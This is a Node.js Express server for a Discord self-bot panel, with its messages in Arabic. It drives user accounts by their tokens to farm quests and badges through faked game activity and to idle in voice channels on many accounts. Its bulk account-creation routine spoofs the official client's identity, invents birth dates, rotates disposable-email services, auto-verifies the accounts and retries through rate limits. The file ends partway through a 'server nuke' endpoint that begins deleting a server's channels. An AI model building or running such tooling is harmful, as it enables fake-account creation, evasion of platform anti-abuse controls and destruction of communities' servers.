import express from 'express';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import { DiscordAccount } from './discord.mjs';
import { GAME_LIBRARY, BADGE_CATALOG } from './games.mjs';

const __dirname = dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = process.env.PORT || 8080;
const API = 'https://discord.com/api/v9';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9164 Chrome/124.0.6367.243 Electron/30.4.0 Safari/537.36';

app.use(express.json());
app.use('/static', express.static(join(__dirname, 'static')));

const accounts = new Map();

// ── pages ──────────────────────────────────────────────────────
app.get('/', (_r, res) => res.sendFile(join(__dirname, 'static', 'index.html')));

// ── account ────────────────────────────────────────────────────
app.post('/api/connect', async (req, res) => {
  const { token } = req.body;
  if (!token) return res.status(400).json({ error: 'التوكن مطلوب' });
  if (accounts.has(token)) return res.json({ success: true, user: accounts.get(token).userInfo, already: true });
  try {
    const acc = new DiscordAccount(token);
    const user = await acc.connect();
    accounts.set(token, acc);
    res.json({ success: true, user });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/disconnect', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (acc) { await acc.disconnect(); accounts.delete(req.body.token); }
  res.json({ success: true });
});

// ── quests ─────────────────────────────────────────────────────
app.get('/api/quests', async (req, res) => {
  const acc = accounts.get(req.query.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  try { res.json({ quests: await acc.getQuests() }); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

// run SELECTED quests in parallel
app.post('/api/run-quests', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  const { quest_ids, turbo } = req.body;
  if (!quest_ids?.length) return res.status(400).json({ error: 'اختر مهام' });
  acc.runQuests(quest_ids, !!turbo);
  res.json({ success: true, count: quest_ids.length });
});

// run all
app.post('/api/start-all', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  acc.autoCompleteAll(!!req.body.turbo);
  res.json({ success: true });
});

app.post('/api/stop-all', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  await acc.stopAll();
  res.json({ success: true });
});

app.post('/api/stop-quest', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  await acc.stopQuest(req.body.quest_id);
  res.json({ success: true });
});

// ── logs ───────────────────────────────────────────────────────
app.get('/api/logs', (req, res) => {
  const acc = accounts.get(req.query.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json({ logs: acc.logs });
});

// ── hypesquad ──────────────────────────────────────────────────
app.post('/api/hypesquad', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json(await acc.setHypeSquad(req.body.house_id));
});

app.post('/api/remove-hypesquad', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json(await acc.removeHypeSquad());
});

// ── active developer ───────────────────────────────────────────
app.get('/api/active-developer', async (req, res) => {
  const acc = accounts.get(req.query.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json(await acc.getActiveDeveloper());
});

app.post('/api/active-developer', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json(await acc.claimActiveDeveloper());
});

// ── badges ─────────────────────────────────────────────────────
app.get('/api/badges', async (req, res) => {
  const acc = accounts.get(req.query.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json(await acc.getBadges());
});

// ── sessions ───────────────────────────────────────────────────
app.post('/api/session', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json(await acc.startSession(req.body.game, req.body.duration || 30, !!req.body.streaming));
});

app.post('/api/stop-session', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  acc.clearActivity();
  res.json({ success: true });
});

// ── streaming ──────────────────────────────────────────────────
app.post('/api/stream', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json(await acc.startStreamSession(req.body.game, req.body.duration || 60));
});

// ── voice pinning ──────────────────────────────────────────────
app.get('/api/guilds', async (req, res) => {
  const acc = accounts.get(req.query.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json({ guilds: await acc.getGuilds() });
});

app.get('/api/voice-channels', async (req, res) => {
  const acc = accounts.get(req.query.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json({ channels: await acc.getVoiceChannels(req.query.guild_id) });
});

app.post('/api/voice-join', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  const { guild_id, channel_id, self_mute = true, self_deaf = true } = req.body;
  res.json(await acc.voiceJoin(guild_id, channel_id, self_mute, self_deaf));
});

app.post('/api/voice-leave', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json(await acc.voiceLeave(req.body.guild_id));
});

app.post('/api/voice-leave-all', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json(await acc.voiceLeaveAll());
});

app.get('/api/voice-status', (req, res) => {
  const acc = accounts.get(req.query.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json({ active: acc.getVoiceStatus() });
});

// ── game rotation (badge farming) ──────────────────────────────
app.post('/api/rotation-start', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  const { games, minutes_per_game } = req.body;
  if (!games?.length) return res.status(400).json({ error: 'اختر ألعاب' });
  res.json(await acc.startGameRotation(games, minutes_per_game || 30));
});

app.post('/api/rotation-stop', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json(await acc.stopGameRotation());
});

app.get('/api/rotation-status', (req, res) => {
  const acc = accounts.get(req.query.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json(acc.getRotationStatus());
});

// ── badge catalog ─────────────────────────────────────────────
app.get('/api/badge-catalog', async (req, res) => {
  const acc = accounts.get(req.query.token);
  if (!acc) return res.json({ badges: BADGE_CATALOG });
  res.json({ badges: await acc.getBadgeCatalog() });
});

app.post('/api/earn-badge', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  const { badge_id } = req.body;
  if (!badge_id) return res.status(400).json({ error: 'حدد شارة' });
  res.json(await acc.earnBadge(badge_id));
});

app.post('/api/earn-badges', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  const { badge_ids } = req.body;
  if (!badge_ids?.length) return res.status(400).json({ error: 'حدد شارات' });
  res.json(await acc.earnMultipleBadges(badge_ids));
});

// ── multi-session ─────────────────────────────────────────────
app.post('/api/multi-session', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json(await acc.startMultiSession(req.body.sessions || []));
});

app.get('/api/active-sessions', (req, res) => {
  const acc = accounts.get(req.query.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json({ sessions: acc.getActiveSessions() });
});

// ── misc ───────────────────────────────────────────────────────
app.get('/api/games', (_r, res) => res.json({ games: GAME_LIBRARY.map(g => g.name) }));

app.get('/api/profile', async (req, res) => {
  const acc = accounts.get(req.query.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  res.json(await acc.getFullProfile());
});

app.get('/api/status', (_r, res) => {
  const summary = [];
  for (const [t, acc] of accounts) {
    summary.push({
      token_masked: t.slice(0, 6) + '...' + t.slice(-4),
      user: acc.userInfo?.username || '?',
      connected: acc.connected,
      active_quests: acc._questRunners.size,
      voice_channels: acc._voiceActive.size,
    });
  }
  res.json({ accounts: summary });
});

// ── custom session ────────────────────────────────────────────
app.post('/api/custom-session', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  const { name, details, state, type, duration, status, image_url } = req.body;
  if (!name) return res.status(400).json({ error: 'اسم النشاط مطلوب' });
  res.json(await acc.startCustomSession(name, details, state, type || 0, duration || 60, status, image_url));
});

// ── stop everything ──────────────────────────────────────────
app.post('/api/stop-everything', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  const stopped = [];
  // stop game rotation
  if (acc._gameRotationRunning) { await acc.stopGameRotation(); stopped.push('game_rotation'); }
  // stop go live
  if (acc._streamGoLiveTimer) { clearTimeout(acc._streamGoLiveTimer); acc._streamGoLiveTimer = null; stopped.push('go_live'); }
  // stop session timer
  if (acc._sessionTimer) { clearTimeout(acc._sessionTimer); acc._sessionTimer = null; stopped.push('session'); }
  // clear activity
  acc.gateway.clearActivity();
  stopped.push('activity');
  // stop all quests
  for (const [qid] of acc._questRunners) { await acc.stopQuest(qid); stopped.push('quest_' + qid); }
  // leave all voice
  await acc.voiceLeaveAll();
  stopped.push('voice');
  // reset status to online
  acc.gateway._userStatus = 'online';
  acc._log('⏹ تم إيقاف كل الجلسات والأنشطة');
  res.json({ success: true, stopped });
});

// ── Go Live (streaming badge) ─────────────────────────────────
app.post('/api/go-live', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  const { guild_id, channel_id, duration } = req.body;
  if (!guild_id || !channel_id) return res.status(400).json({ error: 'السيرفر والقناة مطلوبين' });
  try {
    const r = await acc.startGoLive(guild_id, channel_id, duration || 60);
    res.json(r);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/stop-go-live', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  const { guild_id, channel_id } = req.body;
  try {
    const r = await acc.stopGoLive(guild_id, channel_id);
    res.json(r);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/set-status', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  const { status } = req.body;
  if (!['online', 'idle', 'dnd', 'invisible'].includes(status)) return res.status(400).json({ error: 'حالة غير صحيحة' });
  acc.gateway.setStatus(status);
  res.json({ success: true, status });
});

// ── extra tokens (multi-account voice + online) ───────────────
const extraAccounts = new Map(); // token -> DiscordAccount

app.post('/api/extra-connect', async (req, res) => {
  const { token } = req.body;
  if (!token) return res.status(400).json({ error: 'التوكن مطلوب' });
  if (extraAccounts.has(token)) {
    const ex = extraAccounts.get(token);
    return res.json({ success: true, user: ex.userInfo, already: true });
  }
  if (extraAccounts.size >= 20) return res.status(400).json({ error: 'الحد الأقصى 20 حساب' });
  try {
    const acc = new DiscordAccount(token);
    const user = await acc.connect();
    extraAccounts.set(token, acc);
    res.json({ success: true, user });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/extra-disconnect', async (req, res) => {
  const acc = extraAccounts.get(req.body.token);
  if (acc) { await acc.disconnect(); extraAccounts.delete(req.body.token); }
  res.json({ success: true });
});

app.post('/api/extra-voice-join', async (req, res) => {
  const acc = extraAccounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'الحساب غير متصل' });
  const { guild_id, channel_id } = req.body;
  res.json(await acc.voiceJoin(guild_id, channel_id, true, true));
});

app.post('/api/extra-voice-leave-all', async (req, res) => {
  for (const [, acc] of extraAccounts) {
    await acc.voiceLeaveAll();
  }
  res.json({ success: true });
});

// track provider rotation across retries
let _providerIdx = 0;

// ── temp email helper (rotates through providers on each call) ──
async function getTempEmail() {
  const rnd = () => Math.random().toString(36).slice(2, 10) + Date.now().toString(36).slice(-4);
  const pick = _providerIdx++ % 5; // rotate 0-4

  // provider 0: mail.tm
  if (pick === 0) {
    try {
      const domRes = await fetch('https://api.mail.tm/domains?page=1', { signal: AbortSignal.timeout(5000) });
      const domData = await domRes.json();
      const doms = domData?.['hydra:member'] || [];
      if (doms.length) {
        const domain = doms[Math.floor(Math.random() * doms.length)]?.domain;
        if (domain) {
          const addr = 'u' + rnd() + '@' + domain;
          const pw = 'Px' + rnd() + '!1';
          const cr = await fetch('https://api.mail.tm/accounts', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address: addr, password: pw }), signal: AbortSignal.timeout(5000),
          });
          const acc = await cr.json();
          if (acc?.id) {
            const authRes = await fetch('https://api.mail.tm/token', {
              method: 'POST', headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ address: addr, password: pw }), signal: AbortSignal.timeout(5000),
            });
            const auth = await authRes.json();
            if (auth?.token) return { email: addr, provider: 'mailtm', token: auth.token, password: pw };
          }
        }
      }
    } catch {}
  }

  // provider 1: guerrillamail
  if (pick === 1) {
    try {
      const r = await fetch('https://api.guerrillamail.com/ajax.php?f=get_email_address&lang=en', { signal: AbortSignal.timeout(5000) });
      const d = await r.json();
      if (d?.email_addr) return { email: d.email_addr, provider: 'guerrilla', sid_token: d.sid_token };
    } catch {}
  }

  // provider 2: tempmail.lol
  if (pick === 2) {
    try {
      const r = await fetch('https://api.tempmail.lol/generate', { signal: AbortSignal.timeout(5000) });
      const d = await r.json();
      if (d?.address) return { email: d.address, provider: 'tempmail_lol', token: d.token };
    } catch {}
  }

  // provider 3: guerrilla alt domains
  if (pick === 3) {
    const altDomains = ['sharklasers.com', 'grr.la', 'guerrillamail.info', 'guerrillamail.net', 'spam4.me'];
    const dom = altDomains[Math.floor(Math.random() * altDomains.length)];
    return { email: 'dc' + rnd() + '@' + dom, provider: 'disposable', domain: dom };
  }

  // provider 4: 1secmail
  const secDomains = ['1secmail.com', '1secmail.org', '1secmail.net', 'kzccv.com', 'qiott.com', 'wuuvo.com', 'icznn.com', 'ezjrt.com'];
  const secDom = secDomains[Math.floor(Math.random() * secDomains.length)];
  const secAddr = 'dc' + rnd() + '@' + secDom;
  return { email: secAddr, provider: '1secmail', login: secAddr.split('@')[0], domain: secDom };
}

function extractVerifyLink(body) {
  if (!body) return null;
  const patterns = [
    /href="(https:\/\/[^"]*discord[^"]*verify[^"]*)"/i,
    /https:\/\/(?:click\.)?discord\.com[^\s"'<]+verify[^\s"'<]*/i,
    /https:\/\/discord\.com\/verify#token=([^\s"'<&]+)/i,
  ];
  for (const p of patterns) {
    const m = body.match(p);
    if (m) return m[1] || m[0];
  }
  const tokenMatch = body.match(/token=([A-Za-z0-9._-]{20,})/i);
  if (tokenMatch) return tokenMatch[1];
  return null;
}

async function waitForVerifyEmail(emailInfo, maxWaitSec = 30) {
  const start = Date.now();

  while (Date.now() - start < maxWaitSec * 1000) {
    try {
      let body = '';

      if (emailInfo.provider === 'mailtm' && emailInfo.token) {
        const r = await fetch('https://api.mail.tm/messages?page=1', {
          headers: { Authorization: 'Bearer ' + emailInfo.token },
          signal: AbortSignal.timeout(5000),
        });
        const data = await r.json();
        const msgs = data?.['hydra:member'] || [];
        if (msgs.length > 0) {
          const detail = await fetch('https://api.mail.tm/messages/' + msgs[0].id, {
            headers: { Authorization: 'Bearer ' + emailInfo.token },
            signal: AbortSignal.timeout(5000),
          });
          const full = await detail.json();
          body = full.html?.[0] || full.text || '';
        }
      } else if (emailInfo.provider === 'guerrilla' && emailInfo.sid_token) {
        const r = await fetch('https://api.guerrillamail.com/ajax.php?f=check_email&seq=0&sid_token=' + emailInfo.sid_token, {
          signal: AbortSignal.timeout(5000),
        });
        const data = await r.json();
        const msgs = data?.list || [];
        if (msgs.length > 0) {
          const detail = await fetch('https://api.guerrillamail.com/ajax.php?f=fetch_email&email_id=' + msgs[0].mail_id + '&sid_token=' + emailInfo.sid_token, {
            signal: AbortSignal.timeout(5000),
          });
          const full = await detail.json();
          body = full.mail_body || '';
        }
      } else if (emailInfo.provider === 'tempmail_lol' && emailInfo.token) {
        const r = await fetch('https://api.tempmail.lol/auth/' + emailInfo.token, {
          signal: AbortSignal.timeout(5000),
        });
        const data = await r.json();
        const msgs = data?.email || [];
        if (msgs.length > 0) {
          body = msgs[0].html || msgs[0].body || '';
        }
      } else if (emailInfo.provider === '1secmail') {
        const { login, domain } = emailInfo;
        const r = await fetch(`https://www.1secmail.com/api/v1/?action=getMessages&login=${login}&domain=${domain}`, {
          signal: AbortSignal.timeout(5000),
        });
        const msgs = await r.json();
        if (msgs?.length > 0) {
          const detail = await fetch(`https://www.1secmail.com/api/v1/?action=readMessage&login=${login}&domain=${domain}&id=${msgs[0].id}`, {
            signal: AbortSignal.timeout(5000),
          });
          const full = await detail.json();
          body = full.htmlBody || full.textBody || full.body || '';
        }
      }

      if (body) {
        const link = extractVerifyLink(body);
        if (link) return link;
      }
    } catch {}
    await new Promise(r => setTimeout(r, 3000));
  }
  return null;
}

async function verifyDiscordEmail(verifyUrl, accountToken) {
  const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.6367.243';
  // try clicking the verify link
  try {
    const r = await fetch(verifyUrl, { redirect: 'follow', headers: { 'User-Agent': UA } });
    // extract token from redirect or page
    const text = await r.text();
    const tokenMatch = text.match(/token[=:]["']?([A-Za-z0-9._-]+)/i);
    if (tokenMatch) {
      // verify via API
      await fetch('https://discord.com/api/v9/auth/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'User-Agent': UA, Authorization: accountToken },
        body: JSON.stringify({ token: tokenMatch[1] }),
      });
      return true;
    }
    // if URL itself is a verify token
    if (verifyUrl.length < 200 && !verifyUrl.startsWith('http')) {
      await fetch('https://discord.com/api/v9/auth/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'User-Agent': UA, Authorization: accountToken },
        body: JSON.stringify({ token: verifyUrl }),
      });
      return true;
    }
  } catch {}
  return false;
}

// ── discord register helper with rate limit ──────────────────
// onProgress callback for SSE step updates during waits
async function discordRegister(body, headers, onProgress) {
  for (let attempt = 0; attempt < 3; attempt++) {
    const r = await fetch('https://discord.com/api/v9/auth/register', {
      method: 'POST', headers, body: JSON.stringify(body),
    });
    if (r.status === 429) {
      const rateData = await r.json().catch(() => ({}));
      const waitSec = Math.ceil(rateData.retry_after || 10);
      if (onProgress) onProgress(`⏳ ديسكورد حاظر مؤقتا — انتظار ${waitSec} ثانية... (محاولة ${attempt + 1}/3)`);
      // countdown in 5-second chunks so SSE shows progress
      let remaining = waitSec;
      while (remaining > 0) {
        const chunk = Math.min(remaining, 5);
        await new Promise(res => setTimeout(res, chunk * 1000));
        remaining -= chunk;
        if (remaining > 0 && onProgress) onProgress(`⏳ باقي ${remaining} ثانية على إعادة المحاولة...`);
      }
      continue;
    }
    return await r.json();
  }
  return { message: 'ديسكورد حاظر — جرب بعد دقيقتين', retry_after: 120 };
}

// ── account creation (SSE for live progress) ─────────────────
app.get('/api/create-account-stream', async (req, res) => {
  const { username, display_name, password, email: userEmail } = req.query;
  if (!username || !password) { res.status(400).json({ error: 'اليوزرنيم والباسورد مطلوبين' }); return; }

  res.writeHead(200, {
    'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', Connection: 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });
  const send = (evt, data) => { res.write(`event: ${evt}\ndata: ${JSON.stringify(data)}\n\n`); };

  const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.6367.243 Electron/30.4.0';
  const SUPER = Buffer.from(JSON.stringify({
    os: 'Windows', browser: 'Discord Client', release_channel: 'stable',
    client_version: '1.0.9164', os_version: '10.0.22631', os_arch: 'x64',
    app_arch: 'x64', system_locale: 'en-US', client_build_number: 252528,
  })).toString('base64');

  const year = 1998 + Math.floor(Math.random() * 7);
  const month = String(1 + Math.floor(Math.random() * 12)).padStart(2, '0');
  const day = String(1 + Math.floor(Math.random() * 28)).padStart(2, '0');

  try {
    // step 1: get temp email
    send('step', { step: 1, total: 5, msg: '📧 جاري إنشاء إيميل وهمي...', time: '~3 ثواني' });
    let emailInfo = null;
    let email = userEmail;
    let autoVerify = false;
    if (!email) {
      emailInfo = await getTempEmail();
      email = emailInfo.email;
      autoVerify = true;
      send('step', { step: 1, total: 5, msg: '✅ تم — ' + email, done: true });
    } else {
      send('step', { step: 1, total: 5, msg: '✅ إيميل مقدم: ' + email, done: true });
    }

    // step 2: fingerprint
    send('step', { step: 2, total: 5, msg: '🔑 جاري جلب بصمة ديسكورد...', time: '~2 ثواني' });
    const fpRes = await fetch('https://discord.com/api/v9/experiments', {
      headers: { 'User-Agent': UA, 'X-Super-Properties': SUPER }
    });
    const fp = await fpRes.json();
    const fingerprint = fp.fingerprint || '';
    send('step', { step: 2, total: 5, msg: '✅ تم جلب البصمة', done: true });

    // step 3: register
    send('step', { step: 3, total: 5, msg: '📝 جاري التسجيل في ديسكورد...', time: '~5 ثواني' });
    const body = {
      fingerprint, username, email, password,
      global_name: display_name || username,
      date_of_birth: `${year}-${month}-${day}`,
      consent: true, gift_code_sku_id: null,
    };
    const regHeaders = { 'Content-Type': 'application/json', 'User-Agent': UA, 'X-Super-Properties': SUPER, 'X-Fingerprint': fingerprint };
    const regProgress = (msg) => send('step', { step: 3, total: 5, msg });
    let data = await discordRegister(body, regHeaders, regProgress);

    // auto-retry up to 3 times with fresh emails
    let retries = 0;
    while (!data.token && retries < 3 && autoVerify) {
      const errs = data.errors || {};
      const isEmailErr = errs.email?._errors?.[0]?.code === 'EMAIL_ALREADY_REGISTERED'
        || errs.email?._errors?.[0]?.code === 'EMAIL_TYPE_INVALID_EMAIL'
        || (data.message && data.message.includes('email'));
      const isRateLimit = !!data.retry_after;
      if (!isEmailErr && !isRateLimit) break;
      retries++;
      if (isRateLimit) {
        const waitSec = Math.ceil(data.retry_after || 30);
        send('step', { step: 3, total: 5, msg: `⏳ Rate Limit — انتظار ${waitSec} ثانية...`, time: `~${waitSec} ثانية` });
        let remaining = waitSec;
        while (remaining > 0) {
          const chunk = Math.min(remaining, 5);
          await new Promise(r => setTimeout(r, chunk * 1000));
          remaining -= chunk;
          if (remaining > 0) send('step', { step: 3, total: 5, msg: `⏳ باقي ${remaining} ثانية...` });
        }
      } else {
        send('step', { step: 3, total: 5, msg: `🔄 مشكلة بالإيميل — محاولة ${retries}/3 بإيميل جديد...`, time: '~5 ثواني' });
      }
      emailInfo = await getTempEmail();
      email = emailInfo.email;
      body.email = email;
      send('step', { step: 3, total: 5, msg: `🔄 جاري التجربة: ${email}...` });
      data = await discordRegister(body, regHeaders, regProgress);
    }

    if (!data.token) {
      let errorMsg = 'فشل التسجيل';
      const errs = data.errors || {};
      if (data.retry_after) errorMsg = '⏳ ديسكورد حاظر مؤقتا (Rate Limit) — انتظر ' + Math.ceil(data.retry_after) + ' ثانية وجرب مرة ثانية';
      else if (data.captcha_key) errorMsg = '❌ ديسكورد يحتاج كابتشا — ما نقدر نتجاوزها. الحل: سجل يدوي من discord.com أو استخدم إيميل حقيقي (Gmail)';
      else if (errs.email?._errors?.[0]?.code === 'EMAIL_ALREADY_REGISTERED') errorMsg = '❌ ديسكورد يرفض الإيميلات الوهمية — جرب حط إيميل Gmail حقيقي في خانة الإيميل';
      else if (errs.email?._errors?.[0]) errorMsg = '❌ مشكلة بالإيميل: ' + errs.email._errors[0].message;
      else if (errs.username?._errors?.[0]) errorMsg = '❌ مشكلة باليوزرنيم: ' + errs.username._errors[0].message;
      else if (errs.password?._errors?.[0]) errorMsg = '❌ الباسورد ضعيف — استخدم أحرف كبيرة وصغيرة وأرقام ورموز (8+ حرف)';
      else if (data.message) errorMsg = '❌ ' + data.message;
      send('error', { msg: errorMsg, email_used: email, raw: data });
      res.end();
      return;
    }

    send('step', { step: 3, total: 5, msg: '✅ تم التسجيل — جاري التحقق...', done: true });

    // step 4: auto-verify email
    let verified = false;
    if (autoVerify && emailInfo) {
      send('step', { step: 4, total: 5, msg: '📨 جاري انتظار رسالة التحقق...', time: '~30 ثانية (ديسكورد يرسل الإيميل)' });

      // shorter wait — 30 sec max instead of 60, check every 3 sec
      const verifyLink = await waitForVerifyEmail(emailInfo, 30);
      if (verifyLink) {
        send('step', { step: 4, total: 5, msg: '🔗 لقيت رابط التحقق — جاري التفعيل...' });
        verified = await verifyDiscordEmail(verifyLink, data.token);
        send('step', { step: 4, total: 5, msg: verified ? '✅ تم التحقق من الإيميل!' : '⚠️ ما قدر يتحقق تلقائي — استخدم التوكن عادي', done: true });
      } else {
        send('step', { step: 4, total: 5, msg: '⚠️ ما وصلت رسالة التحقق — الحساب شغال بدونها', done: true });
      }
    } else {
      send('step', { step: 4, total: 5, msg: '⏭ تخطي التحقق (إيميل مقدم)', done: true });
    }

    // step 5: set display name
    send('step', { step: 5, total: 5, msg: '✨ جاري تعيين الاسم...', time: '~2 ثواني' });
    if (display_name) {
      await fetch('https://discord.com/api/v9/users/@me', {
        method: 'PATCH',
        headers: { Authorization: data.token, 'Content-Type': 'application/json', 'User-Agent': UA },
        body: JSON.stringify({ global_name: display_name }),
      });
    }
    send('step', { step: 5, total: 5, msg: '✅ تم!', done: true });

    send('done', { success: true, token: data.token, username, email, verified, display_name: display_name || username });
  } catch (e) {
    send('error', { msg: 'خطأ: ' + e.message });
  }
  res.end();
});

// legacy POST for compatibility
app.post('/api/create-account', async (req, res) => {
  const { username, display_name, password, email: userEmail } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'اليوزرنيم والباسورد مطلوبين' });

  const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.6367.243 Electron/30.4.0';
  const SUPER = Buffer.from(JSON.stringify({
    os: 'Windows', browser: 'Discord Client', release_channel: 'stable',
    client_version: '1.0.9164', os_version: '10.0.22631', os_arch: 'x64',
    app_arch: 'x64', system_locale: 'en-US', client_build_number: 252528,
  })).toString('base64');
  const year = 1998 + Math.floor(Math.random() * 7);
  const month = String(1 + Math.floor(Math.random() * 12)).padStart(2, '0');
  const day = String(1 + Math.floor(Math.random() * 28)).padStart(2, '0');

  try {
    let emailInfo = null, email = userEmail, autoVerify = false;
    if (!email) { emailInfo = await getTempEmail(); email = emailInfo.email; autoVerify = true; }
    const fpRes = await fetch('https://discord.com/api/v9/experiments', { headers: { 'User-Agent': UA, 'X-Super-Properties': SUPER } });
    const fp = await fpRes.json();
    const fingerprint = fp.fingerprint || '';
    const body = { fingerprint, username, email, password, global_name: display_name || username, date_of_birth: `${year}-${month}-${day}`, consent: true, gift_code_sku_id: null };
    const regHeaders = { 'Content-Type': 'application/json', 'User-Agent': UA, 'X-Super-Properties': SUPER, 'X-Fingerprint': fingerprint };
    const data = await discordRegister(body, regHeaders);
    if (data.token) {
      let verified = false;
      if (autoVerify && emailInfo) { const vl = await waitForVerifyEmail(emailInfo, 30); if (vl) verified = await verifyDiscordEmail(vl, data.token); }
      if (display_name) await fetch('https://discord.com/api/v9/users/@me', { method: 'PATCH', headers: { Authorization: data.token, 'Content-Type': 'application/json', 'User-Agent': UA }, body: JSON.stringify({ global_name: display_name }) });
      res.json({ success: true, token: data.token, username, email, verified, display_name: display_name || username });
    } else {
      let errorMsg = 'فشل التسجيل'; const errs = data.errors || {};
      if (data.retry_after) errorMsg = 'ديسكورد حاظر مؤقتا — انتظر ' + Math.ceil(data.retry_after) + ' ثانية';
      else if (data.captcha_key) errorMsg = 'ديسكورد يحتاج كابتشا';
      else if (errs.email?._errors?.[0]) errorMsg = 'مشكلة بالإيميل: ' + errs.email._errors[0].message;
      else if (data.message) errorMsg = data.message;
      res.json({ success: false, captcha_required: !!data.captcha_key, email_used: email, errors: errorMsg, raw: data });
    }
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ── BULK ACTIVITY REPORT (badge seeding) ────────────────────
app.post('/api/report-activities', async (req, res) => {
  const acc = accounts.get(req.body.token);
  if (!acc) return res.status(401).json({ error: 'غير متصل' });
  const { games, sessions_per_game, session_minutes } = req.body;
  if (!games?.length) return res.status(400).json({ error: 'اختر ألعاب' });
  res.json(await acc.reportBulkActivitySessions(games, sessions_per_game || 3, session_minutes || 30));
});

// ── SERVER NUKE ──────────────────────────────────────────────
app.post('/api/nuke', async (req, res) => {
  const { token, guild_id } = req.body;
  if (!token || !guild_id) return res.status(400).json({ error: 'التوكن و ايدي السيرفر مطلوبين' });

  // SSE for live progress
  res.writeHead(200, {
    'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', Connection: 'keep-alive',
  });
  const send = (evt, data) => { res.write(`event: ${evt}\ndata: ${JSON.stringify(data)}\n\n`); };
  const headers = { Authorization: token, 'Content-Type': 'application/json', 'User-Agent': UA };

  try {
    // verify we have admin
    send('step', { msg: 'جاري التحقق من الصلاحيات...' });
    const me = await fetch(`${API}/users/@me`, { headers }).then(r => r.json());
    if (!me.id) { send('error', { msg: 'توكن غير صالح' }); res.end(); return; }

    const guild = await fetch(`${API}/guilds/${guild_id}`, { headers }).then(r => r.json());
    if (guild.message || !guild.id) { send('error', { msg: 'ما قدر يوصل للسيرفر — تأكد من الايدي والصلاحيات' }); res.end(); return; }
    send('step', { msg: `سيرفر: ${guild.name} — بدأ النيوك...` });

    let deleted = { channels: 0, roles: 0, bans: 0 };

    // 1. Delete all channels
    send('step', { msg: 'جاري مسح القنوات...' });
    const channels = await fetch(`${API}/guilds/${guild_id}/channels`, { headers }).then(r => r.json());
